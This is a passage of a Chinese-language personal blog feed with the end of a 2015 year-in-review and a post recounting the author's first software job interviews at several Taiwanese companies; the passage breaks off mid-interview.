&lt;p&gt;然後好像是第一次和女友出遊吧，雖然不是只有兩個人就是。&lt;br /&gt;
然後還第一次生吃蜂蛹 (嘎蹦脆?)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;2 月&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;第 3 度失戀，而且還是在情人節前幾天。  &lt;/li&gt;
&lt;li&gt;看了 Halt and Catch Fire 前幾集，覺得非常 Geek 非常棒。  &lt;/li&gt;
&lt;li&gt;去當命理師的二姑丈家拜年，拿出我的生辰八字講了我一下我的命理流年，覺得有趣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;總之大概就是個寒假加過年耍廢的狀況  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;3 月&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/"&gt;SITCON 演講&lt;/a&gt;（第一次住中研院）  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2015/03/20/github-talk-advanced-git-and-ci-in-nctu/"&gt;社團邀請了 GitHub 來交大演講&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;校園徵才博覽會，要當兵的各種沒人權，頻頻被打槍，只能拿贈品。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;4 月&lt;/h2&gt;
&lt;p&gt;似乎就是個在忙作業的一個月，&lt;br /&gt;
主要是 FOSS 的跟 Open Source 歷史有關的作業中，&lt;br /&gt;
有很多不懂的東西，去查了許多，並紀錄在 Hackpad，&lt;br /&gt;
乾脆把 3 個作業都丟在這裡紀錄一下好了。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://fossapc.hackpad.com/Homework-1-Spring-2015-xRiTawd3dQN"&gt;Homework 1&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://fossapc.hackpad.com/Homework-2-Spring-2015-bx8iaziDzsL"&gt;Homework 2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://fossapc.hackpad.com/Homework-3-Spring-2015-u47zBtEgHKN"&gt;Homework 3&lt;/a&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;5 月&lt;/h2&gt;
&lt;p&gt;準備 TSCC （台灣全國學生叢集電腦競賽）的一個月，紀錄在&lt;a href="/posts/2015/05/02/note-for-tscc-2015/"&gt;這篇&lt;/a&gt;&lt;br /&gt;
知道了很多當時不知道的東西，ex: InfiniBand, ICC, ...  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;6 月&lt;/h2&gt;
&lt;p&gt;TSCC 佳作 (第四名)，紀錄在&lt;a href="/posts/2015/09/15/tscc-2015-notes-and-thoughts/"&gt;這篇&lt;/a&gt;&lt;br /&gt;
和 小趴、伊達、dv、喜德、divazone 組隊，&lt;br /&gt;
都算是對資工有興趣的人，再加上小飛機的幫忙，合作起來很愉快。  &lt;/p&gt;
&lt;p&gt;畢業典禮當天跑去中研院參加 PyCon APAC 2015，也是第二次參加 PyCon TW。&lt;br /&gt;
覺得與其參加畢業典禮，跑去參加 Conference 還比較值得。&lt;br /&gt;
心得紀錄在&lt;a href="/posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/"&gt;這篇&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;沒抽中替代役。&lt;br /&gt;
6 月底因為在學校當助教的事情還沒處理完，辦了一次延徵。&lt;br /&gt;
看了身高體重表發現差四公斤免役，準備增肥計劃。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;7 月&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;待在家繼續增肥，月中申請體重複檢。  &lt;ul&gt;
&lt;li&gt;但同時又被我弟抓去打籃球和跟我爸去游泳  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繼續開發 &lt;a href="https://github.com/zdict/zdict"&gt;zdict&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;研究和撰寫一些小型的開源軟體  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/imageme"&gt;imageme&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/gettitle"&gt;gettitle&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;高雄氣爆  &lt;/li&gt;
&lt;li&gt;高中生反課綱  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;8 月&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;拿到國家認証的肥宅證明書，不用當兵。  &lt;/li&gt;
&lt;li&gt;COSCUP 2015 (COSCUP 十週年)  &lt;ul&gt;
&lt;li&gt;宅色夫宣佈封麥  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/welkineins/status/632397066698756097"&gt;「男人有錢會變壞 linux 使用者有錢會投入 Mac 的懷抱」&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得很多人還是不夠認真看待開源這件事  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q/statuses/632819732501041152"&gt;「為啥講到專案都是一個人寫的時候一堆人都笑了 真的笑不出來啊」&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;拖到後來就沒寫心得文了 囧  &lt;/li&gt;
&lt;li&gt;決定把 OS X 砍了，重回 Linux Desktop Environment 的懷抱，灌 Arch Linux 在 Macbook Air 2013 上面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2015/08/29/hitcon-2015-iot-wargame/"&gt;HITCON 2015&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;拿來翻牆用的 ShadowSocks 的作者被中共抄家了，把他當時的版本回復了一下。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/shadowsocks"&gt;GitHub - M157q/shadowsocks: (Restored to versoin 2.8.2 and wiki) A secure socks5 proxy, designed to protect your Internet traffic.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;天津氣爆  &lt;/li&gt;
&lt;li&gt;Install OpenWRT on Raspberry Pi  &lt;ul&gt;
&lt;li&gt;又一個原本打算要寫結果沒寫的文章  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;9 月&lt;/h2&gt;
&lt;p&gt;(好麻煩噢，之後的不想寫了XD）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;上半年待在學校的日子&lt;/h2&gt;
&lt;p&gt;大概就是個渾渾噩噩只求修完 Compiler 畢業的一段日子吧？&lt;br /&gt;
CTF 打了幾場，但實力沒有啥顯著的長進。&lt;br /&gt;
唯一修的比較快樂的課就屬 jserv 開的 FOSS （自由軟體專案與協作） 了，&lt;br /&gt;
聽了很多歷史，瞭解了許多開源界的來龍去脈，&lt;br /&gt;
自己在舊舊的筆電上把 Mosaic browser 跑起來，享受那種復古的感覺。&lt;br /&gt;
和 Pellaeon 和 dv 做了部&lt;a href="https://www.youtube.com/watch?v=LLtj41eyvcA"&gt;簡單介紹 USL vs BSDi 歷史的影片&lt;/a&gt;。&lt;br /&gt;
（雖然影片拍攝的時候忙著唸 Compiler，所以只參與了劇本和幫忙上字幕的部份）&lt;br /&gt;
雖然不是門很重實作的課，但真的很喜歡這種一邊介紹歷史一邊融入程式碼和技術相關課程的感覺。&lt;br /&gt;
不是那種不知道為什麼而學的課程。  &lt;/p&gt;
&lt;p&gt;寫程式的部份，大概就是第一次由自己寫了一個符合 Python 開源專案架構的 zdict 吧，&lt;br /&gt;
雖然是改寫自 ydict，而不是完全原創，&lt;br /&gt;
但因為自己的需求而改寫，然後 iblis 看到之後也跳進來和我一起熬夜看日出寫程式碼，&lt;br /&gt;
然後 dv, pi, apua 也因為想直接用 terminal 查字典而跳進來一起開發，&lt;br /&gt;
這種感覺真的很棒，我也從中學到了很多東西，像是以前不曾寫過的 unit tests 等等。&lt;br /&gt;
（雖然一堆願望都還在 issues 裏面等待被實現 XDrz）  &lt;/p&gt;
&lt;p&gt;然後擔任著計算機網路管理的助教，&lt;br /&gt;
當助教跟修課完全是兩回事啊，&lt;br /&gt;
覺得自己的備課和講課的技巧仍然是有待加強，&lt;br /&gt;
也確認了自己的確是不太適合擔任教職。XD  &lt;/p&gt;
&lt;p&gt;上半年好像看比較多美國影劇學單字，下半年就比較少一點。&lt;br /&gt;
其實會想開發 zdict 的原因主要也是因為看影劇的時候查單字比較方便，&lt;br /&gt;
然後還可以順便紀錄生字這樣。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;下半年待在家當尼特的日子&lt;/h2&gt;
&lt;p&gt;原本是打算進去當兵的，&lt;br /&gt;
但就是因為看到兵單一起附上的身高體重對照表後，&lt;br /&gt;
發現只差了 4 kg 就想說乾脆吃一吃去申請複檢看能不能免役好了，&lt;br /&gt;
然後兩個月後確認免役。  &lt;/p&gt;
&lt;p&gt;之後去了 HITCON 和 COSCUP&lt;br /&gt;
想說順便看看有沒有啥跟 Open Source 比較有關的公司可以投履歷，&lt;br /&gt;
但也沒找到。  &lt;/p&gt;
&lt;p&gt;之後就做著自己想做的事，&lt;br /&gt;
把 MBA 2013 的 OS X 砍了，灌了 Arch Linux。&lt;br /&gt;
在 RespberryPi 上灌了 OpenWRT。&lt;br /&gt;
寫 CheckiO 練練 Python 解題手感，&lt;br /&gt;
順便還在 Livecoding.tv 上開台實況。&lt;br /&gt;
其實開實況還蠻有趣的，&lt;br /&gt;
而且因為有人會看(真的有嗎?)，&lt;br /&gt;
所以也不太敢打混摸魚XD。&lt;br /&gt;
然後找了一點 GitHub 上我會用到的程式，&lt;br /&gt;
除了 fork 下來自己修以外，&lt;br /&gt;
也有送些 PR 回去。&lt;br /&gt;
工作也一邊在看，但沒有很積極的去找就是，&lt;br /&gt;
甚至一度考慮當個 Freelancers 接些國外的 case 之類的。  &lt;/p&gt;
&lt;p&gt;去駕訓班學開車也蠻有趣的，&lt;br /&gt;
最後是筆試 95、路考 84 （上坡輪胎超線被扣 16 分的樣子）拿到駕照，&lt;br /&gt;
不過跟實際開上路真的是兩回事就是了。  &lt;/p&gt;
&lt;p&gt;把《Initial D》和最早的《七龍珠》兩部經典動畫補完了。  &lt;/p&gt;
&lt;p&gt;十一月中拿到駕照後，&lt;br /&gt;
也差不多該找個工作了，&lt;br /&gt;
目標就放在 2015 年底之前要找到。&lt;br /&gt;
關於找工作的部份就紀錄在&lt;a href="/posts/2016/02/12/first-job-interviews/"&gt;這篇&lt;/a&gt;了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;p&gt;其實我也不知道該怎麼總結 2015，&lt;br /&gt;
原本就是打算進去當兵，&lt;br /&gt;
所以下半年原本就沒啥規劃。  &lt;/p&gt;
&lt;p&gt;噢，然後 2015 只看了 9 本實體書，真的有點少。&lt;br /&gt;
然後和人借很久的書都還沒看完，希望 2016 可以把書看完還人。&lt;br /&gt;
花在看網頁的資訊可以少一點。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2015 的瀏覽量用 pocket 存起來後約 650,000 words，&lt;br /&gt;
相當於 14 本書，&lt;a href="https://getpocket.com/stats/2015/d09d06e5f2"&gt;成為 pocket top 5% user&lt;/a&gt;...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;總之就希望新的一年裡：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以看更多一點的實體書，養成閱讀實體書的習慣。  &lt;/li&gt;
&lt;li&gt;把在 Tagtoo 的工作做好。  &lt;/li&gt;
&lt;li&gt;準備 GRE, TOFEL 等考試，為之後出國唸書工作做準備。  &lt;/li&gt;
&lt;li&gt;多接觸社群的活動與人，多和別人交流想法。  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;狀況就一樣紀錄在置頂的那篇文章了。  &lt;/p&gt;</summary><category term="Life"></category></entry><entry><title>我的新鮮人面試紀錄</title><link href="https://blog.m157q.tw/posts/2016/02/12/first-job-interviews/" rel="alternate"></link><published>2018-01-18T18:19:00+08:00</published><updated>2018-01-18T18:19:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-02-12:posts/2016/02/12/first-job-interviews/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;從去年 11/13 開始寫完我的 LinkedIn profile 後，算是開始找工作的起點。&lt;br /&gt;
但過沒多久就發現，LinkedIn 充其量只能當作參考，也不是必要的，最重要的還是 resume。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;LinkedIn 好難用，所以寫了個程式。&lt;/h3&gt;
&lt;p&gt;當時因為覺得 LinkedIn 很難用，&lt;br /&gt;
再加上花了不少時間寫 LinkedIn profile，懶的重寫一份 resume。&lt;br /&gt;
於是異想天開的寫了一個把 LinkedIn profile 轉成 markdown format 的工具:&lt;br /&gt;
&lt;a href="https://github.com/M157q/linkedin2md"&gt;linkedin2md&lt;/a&gt;&lt;br /&gt;
（2017/09/22: 這個 project 因為&lt;a href="https://github.com/M157q/linkedin2md/commit/297f1c3ca0c2d40add957fd735b8bf825268a38b"&gt;一些原因&lt;/a&gt;所以我不再維護了，程式已經不會動了。）&lt;br /&gt;
這樣我就可以偷懶直接用 LinkedIn 生一份 resume 出來。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;公司要的是 Resume，不是 CV。&lt;/h3&gt;
&lt;p&gt;結果當然是個悲劇，&lt;br /&gt;
因為 LinkedIn 上的形式比較像是 CV，紀錄你所有做過的事，&lt;br /&gt;
這對一份 resume 來說實在是太過於雜亂無章且毫無重點可言，&lt;br /&gt;
雖然跟我的經歷也有點關係就是，&lt;br /&gt;
因為一直就是有興趣的東西我就會去碰，所以容易給人一種鼯鼠五技而窮的感覺。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;覺得整理想去的公司好麻煩，乾脆整理在 GitHub 上&lt;/h3&gt;
&lt;p&gt;於是過了一個月，到了十二月中旬，&lt;br /&gt;
才把&lt;a href="https://github.com/M157q/resume/blob/8a70dabbea604ec780c247baa683b1df46d612d4/archives/version-1/resume.pdf"&gt;第一版英文履歷&lt;/a&gt;生了出來。&lt;br /&gt;
之後大概就是往 Web Backend 跟 DevOps 這兩個職位去找，&lt;br /&gt;
並把想投的公司及狀況紀錄在 &lt;a href="https://github.com/M157q/resume/issues"&gt;Issues · M157q/resume · GitHub&lt;/a&gt;。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;透過獵人頭找工作&lt;/h3&gt;
&lt;p&gt;然後又想到之前參加某個 Open Source 的 conf 時，&lt;br /&gt;
看到臺灣有家叫 &lt;a href="https://sudo.com.tw"&gt;sudo&lt;/a&gt; 的新公司，&lt;br /&gt;
專門在幫軟體工程師找工作，&lt;br /&gt;
基本上就是獵人頭這樣。&lt;br /&gt;
於是就到他們網站上用 GitHub 帳號登入，&lt;br /&gt;
把相關資料填一填跟履歷上傳後，&lt;br /&gt;
申請該平台上面的職缺。&lt;br /&gt;
（必須說這平台比 LinkedIn 簡單好用多了，雖然因為是新平台還有蠻多 bug 就是，&lt;br /&gt;
但我有反應的 bug 跟意見他們的工作人員都還蠻快就回覆然後請工程師解決。&lt;br /&gt;
而且 sudo 上的履歷支援 markdown 語法，光是這點我就覺得比 LinkedIn 好用了。&lt;br /&gt;
我一直覺得 LinkedIn 自訂的 description 不能用超連結，只能用純文字 URL 是件很扯的事。）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;履歷寫的太爛，被慘電。&lt;/h3&gt;
&lt;p&gt;之後在去年十二月底收到第一個面試通知，&lt;br /&gt;
期間也一直在修改我的履歷，&lt;br /&gt;
尤其是在收到第一個面試通知之前，&lt;br /&gt;
跑去成大當面給 Jserv review 我的第一份 resume 被慘電 3 個小時，&lt;br /&gt;
著實獲益良多。&lt;br /&gt;
詳細內容則紀錄在 &lt;a href="/posts/2016/01/22/how-to-write-a-resume-for-programming-jobs/"&gt;程式設計師的履歷撰寫要點&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/M157q/resume/blob/8a70dabbea604ec780c247baa683b1df46d612d4/resume.pdf"&gt;最終版本的履歷在此&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;面試紀錄&lt;/h2&gt;
&lt;h3&gt;Tagtoo - 塔圖科技&lt;/h3&gt;
&lt;p&gt;這間是我在 sudo 上自己主動投的，&lt;br /&gt;
主要是之前參加 PyCon 知道這間的 CTO 是 PyCon 的 Staff 之一，&lt;br /&gt;
感覺進去應該可以很開心的寫 Python，&lt;br /&gt;
不過沒想到面試的時候才知道 CTO 已經把整個 team 都帶到另外一間新公司了。&lt;br /&gt;
（這又是另外一個故事了w）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;應徵職位：Web Backend (Python) Engineer  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/resume/issues/10"&gt;https://github.com/M157q/resume/issues/10&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試時間：2015/12/30 16:00  &lt;/li&gt;
&lt;li&gt;面試地點：台北市光復南路 612 號 5 樓  &lt;/li&gt;
&lt;li&gt;面試官：Teddy (CEO)  &lt;/li&gt;
&lt;li&gt;面試過程  &lt;ul&gt;
&lt;li&gt;Teddy 跟我介紹 Tagtoo 的 Server 架構，說明公司內部會需要用到哪些東西，主要就網站後端用 Python, 前端基本的 JavaScript, HTML, CSS 可能會需要支援，但主要是後端開發。然後 CI 用 Travis, CD 用 Google Cloud Platform。大致介紹完後跟我說明 2016 年的目標是進軍東南亞的廣告市場，因為台灣的市場開發的差不多了，所以會有新的挑戰可以做。過程中都可以隨時提問，我對 server 的架構問了些問題。  &lt;/li&gt;
&lt;li&gt;之後問了我的兵役狀況，就把從常備役變免役的事敘述一遍。然後又問我為什麼沒繼續唸碩士，就把我看到很多學長姊進了 Lab 也沒辦法做自己有興趣的 Project，大部份都是接 Lab 裡的學長姊留下來的論文計劃，或是教授新接的計劃，甚至有些人連為什麼要唸碩士都沒有個明確的目標，就覺得大家都繼續唸上去，就跟著申請跟考試，有了就去唸，當然也有人是因為不想當兵想當研發替代役而唸。我坦白說我現階段對於唸碩士沒有什麼強烈的動機和意願，想先出來工作瞭解業界的情況和會用到的東西，再來看需要學什麼理論，一邊準備托福，之後考慮到美國發展。  &lt;/li&gt;
&lt;li&gt;然後提到了履歷，Teddy 說有先看過我的 GitHub (這點讓我當下小開心了一下) ，然後問我的履歷中印象最深刻及收穫最多的是哪一項，並描述這項事情的內容。我就選了大學時弄的專題，把專題的架構以及各個部份是在負責什麼功能，以及大致上是如何去實作的過程都講了。得到的回應是覺得我還不錯，因為面試過許多工程師都無法清楚描述自己做過的專案。  &lt;/li&gt;
&lt;li&gt;被問到「在做過的事情中，跟專業技能無關的部份遇到的最大困難是什麼？」。就提了大學專題在做上台報告的時候，因為做的東西是比較偏分析類，不像其他組有的做遊戲、有的做嵌入式等等，有成品可以 Demo，所以我這組在報告的時候就顯得頗枯燥乏味，於是深深體會到將專業技術清楚得表達是很重要的一件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結果  &lt;ul&gt;
&lt;li&gt;Offer Got  &lt;/li&gt;
&lt;li&gt;60 K * 13  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;17 Media (就做 17 App 的那家)&lt;/h3&gt;
&lt;p&gt;這間是 sudo 那邊把我的履歷投給他們看之後，&lt;br /&gt;
他們覺得有興趣，然後找我去面試的。&lt;br /&gt;
聽到是麻吉大哥的那間 17 App 我也蠻有興趣去面試的，&lt;br /&gt;
原本在他還沒聯絡我的時候我就有在 sudo 上看到，&lt;br /&gt;
但當時看到要寫 Node.js 我就沒打算投了。&lt;br /&gt;
畢竟我 Node.js 只有大學專題的時候自己寫一寫而已。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;應徵職位：API Backend Developer / Cloud System Admin （透過 sudo 投遞）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/resume/issues/21"&gt;https://github.com/M157q/resume/issues/21&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試時間：2016/01/08 11:30  &lt;/li&gt;
&lt;li&gt;面試地點：台北市信義區信義路五段 2 號 6 F (震旦大樓)  &lt;/li&gt;
&lt;li&gt;面試官：Popo (CEO)  &lt;/li&gt;
&lt;li&gt;面試過程  &lt;ul&gt;
&lt;li&gt;早到五分鐘，不過會議桌好像有人在談生意，所以我就在沙發上稍微等了一下，順便觀察公司環境。環境蠻寬敞明亮的，員工彼此都是坐在好幾張大桌子上，沒有隔版。有大冰箱、一整櫃零食櫃還有咖啡機，放著員工自己想聽的音樂，基本上就是我喜歡的那種新創環境。  &lt;/li&gt;
&lt;li&gt;一開始 Popo 要我自我介紹，我就照履歷上列出來的事情每件稍微講了一下，我邊講他才邊點開連結看，感覺應該沒有事先看過。  &lt;/li&gt;
&lt;li&gt;之後問了我對 Node.js 的熟悉程度，就跟他說大學專題的時候我有自己稍微寫一下，但沒有到很熟。之後聊一聊就說如果之後進去的話，應該就是負責撰寫 API doc 跟調整 Node.js 的部份。  &lt;/li&gt;
&lt;li&gt;之後大致上就是一些閒聊，我也記得不太熟了，就有問他對於 17 App 前陣子染黃有什麼看法和應對，聽到一個我覺得還蠻有趣的答案。在新聞大幅報導過後，他們現在對於色情是完全禁止的，檢查的方法是透過程式定時去擷取實況用戶的畫面，再丟給 Machine Learning 去判斷是否有色情的成份，如果有的話會先暫時停止播放，再經由人工確認，如果確定是色情的話就會直接 ban 掉帳號。  &lt;/li&gt;
&lt;li&gt;然後聊一聊，聊到程序員鼓勵師，還聊到學到了一個新單字，聖人模式的英文叫 "Moment of Clarity"，不要問我為什麼會聊到這個www。走的時候還很讓我到冰箱挑了一瓶飲料，還不錯XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結果  &lt;ul&gt;
&lt;li&gt;無聲卡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Akatsuki - 曉數碼&lt;/h3&gt;
&lt;p&gt;這間也是 sudo 幫我找的，是間日商，在台灣開辦公室。&lt;br /&gt;
真的要特別講一下這間，明明是間外商，也說不要求日文能力，&lt;br /&gt;
可是我交英文履歷過去後，sudo 那邊就跟我說這間的人資需要我交一份中文履歷。&lt;br /&gt;
當下聽到有點傻眼，想說中文履歷大概就這家會要而已，&lt;br /&gt;
而且光寫那份英文履歷就花了我好久的時間，要寫中文的話等於是要重寫，所以我就拒絕。&lt;br /&gt;
之後去面試我有當場確認，的確是這麼一回事，&lt;br /&gt;
人資表示如果確定進入二面的話，就一定得交中文履歷。&lt;br /&gt;
我有當場問原因，人資表示雖然是外商公司，但也不是每位員工都有辦法懂履歷上的英文。&lt;br /&gt;
（其實聽到這裡有點傻眼XDDD）  &lt;/p&gt;
&lt;h4&gt;第一階段&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;應徵職位：Application Engineer / Backend Server Engineer （透過 sudo 投遞）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/resume/issues/22"&gt;https://github.com/M157q/resume/issues/22&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試時間：2016/01/11 14:00  &lt;/li&gt;
&lt;li&gt;面試地點：松山區南京東路四段16號7樓B  &lt;/li&gt;
&lt;li&gt;面試官：Kana (HR Manager, Eng), ??? (HR, 中文)  &lt;/li&gt;
&lt;li&gt;面試過程  &lt;ul&gt;
&lt;li&gt;兩位人資，一位負責英文面試，另外一位負責中文面試，但不是分開的，兩位會一起面試，所以是一對二這樣。不過老實說我好像是當天才知道要英文面試，忘記當時在忙什麼了，總之當天 sudo 的獵人頭 Jane 告知我面試是英文的，然後我也在當天查到 ptt 上有一位來面試過有發心得，說是要英文面試。不過我大概只有一點點小緊張，對自己的英文口說還算是有點自信，平常有在看美劇，通常只看英文字幕，偶爾有空會練練不看字幕，然後跟著學聽到的口語，雖然有點久沒講就是。（事後證明還是有點生疏XD）  &lt;/li&gt;
&lt;li&gt;英文面試的過程就先要求兩分鐘自我介紹，然後講自己履歷上的事情，然後提到自己的社團平常在做的事，討論課外和資工相關的話題，開社課推廣資訊教育。會去參加開源社群的聚會，認識業界的人士，瞭解開源界的一些最新議題。然後問我說有沒有玩過他們家的遊戲，還有平常有沒有玩手機遊戲或電玩的習慣。然後被問到自己最近 3 年的規劃，就講了下自己打算先工作，瞭解自己的能力與業界的狀況，然後一邊準備托福等等英文考試，之後打算有機會的話往國外發展，主要應該會是美國，但歐洲也有在考慮。之後又被問之後 10 年的計劃，其實也沒有很明確，就講說自己想透過工作確立自己想鑽研的領域，之後繼續不斷學習新的技術和吸收新的理論。  &lt;/li&gt;
&lt;li&gt;英文面試結束後是中文面試，問的內容其實差不多。（其實我不確定是不是中文面試的人資不太懂英文所以需要再問一次，但我也不好意思問。）有多問覺得自己的優缺點是什麼，我就回答自己是屬於那種可以自行摸索並研究實作方法的人，不像大多數同儕屬於被動式的學習。缺點的話就是在對話的當下有時候有些問題不會馬上發問，因為無法確定自己的問題是不是早就已經有答案但只是自己還沒找過。還有自己的個性有點木訥，跟人比較難熟，在團隊合作可能會有一些磨合期。（結果我一說到這裡兩位人資都笑說他們覺得我不像是這種人。是說用英文面試的那位人資經理是日本人，然後也懂中文，真的蠻厲害的。）  &lt;/li&gt;
&lt;li&gt;之後就問我有沒有什麼其他問題要問，我對於人資方面其實沒啥問題問，薪資、福利、工作環境、進修機會這些我其實沒有看的很重，我找的每間公司大概都不會差到哪去，也都是我可接受的範圍。主要還是想看看公司在做的事情我有沒有興趣，然後之後可以學到新的東西或接觸到新的事物的機會多不多。主要想問的還是偏技術和未來發展居多，不過人資就說這方面的問題他們比較無法回答。然後就問了他們覺得跟雷亞遊戲比起來的優缺點還有之後到日本出差或是工作的機會多不多這樣。  &lt;/li&gt;
&lt;li&gt;要離開之前我特地再確認了一次，如果要進入二面的話是不是一定得交中文履歷。人資跟我說「是的」，然後我就走出門了。話說辦公室真的蠻大的，在小巨蛋旁的金融大樓的其中一層，不過缺點就是金融業的抽煙人口真的超多，進出門口就全部都是二手菸，我完全無法忍受。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結果  &lt;ul&gt;
&lt;li&gt;不進入二階面試。原因是覺得我的技能樹跟他們公司的需求不符，還有覺得我稍嫌自信，未來如果進入公司可能在團隊合作上會有問題。  &lt;ul&gt;
&lt;li&gt;技能樹不太 match 的確是事實，不過稍嫌自信我當下怎麼想都想不透，後來覺得是中文履歷的問題，大概是因為我死都不肯寫個中文履歷，覺得之後公司有什麼要求我可能也會據理力爭的不照辦一些事情，會讓他們覺得很麻煩吧？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但也是很感謝兩位人資花時間面試我，畢竟這是我人生第一個英文面試。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;VMFive&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應徵職位：Cloud Engineer in Operation （透過 Referral）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/resume/issues/14"&gt;https://github.com/M157q/resume/issues/14&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試時間： 2016/01/12 16:00  &lt;/li&gt;
&lt;li&gt;面試地點： 台北市大安區敦化南路二段 105 號 19 樓 B 室  &lt;ul&gt;
&lt;li&gt;這位置超尷尬的，在 4 個捷運站中間  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試官： HR, Patrick, Michael, ?  &lt;/li&gt;
&lt;li&gt;面試過程  &lt;ul&gt;
&lt;li&gt;人資面試  &lt;ul&gt;
&lt;li&gt;就一樣基本的自我介紹，然後人資請我舉出自己的優缺點各 3 個。  &lt;/li&gt;
&lt;li&gt;優點  &lt;ol&gt;
&lt;li&gt;自己有當過 mentor 的經驗  &lt;/li&gt;
&lt;li&gt;有給過演講的經驗而且評價還算不錯，算是能夠清楚的表達技術  &lt;/li&gt;
&lt;li&gt;對於有興趣的東西能夠自己花時間研究並找出實作方法。  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ol&gt;
&lt;li&gt;當下有疑慮的時候不一定會馬上提問，可能會先思考後事後才會提問  &lt;/li&gt;
&lt;li&gt;學習東西的時候常常得瞭解來龍去脈並有一個明確的動機才會的卯起勁去學，否則就會覺得不太有興趣而不想投入時間  &lt;/li&gt;
&lt;li&gt;和人相處比較慢熟，而且不太擅長將事務交代給他人去做。  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;三位 Engineer 面試  &lt;ul&gt;
&lt;li&gt;這應該是我這些面試中最硬的一個面試，問的問題也是最精闢的。  &lt;/li&gt;
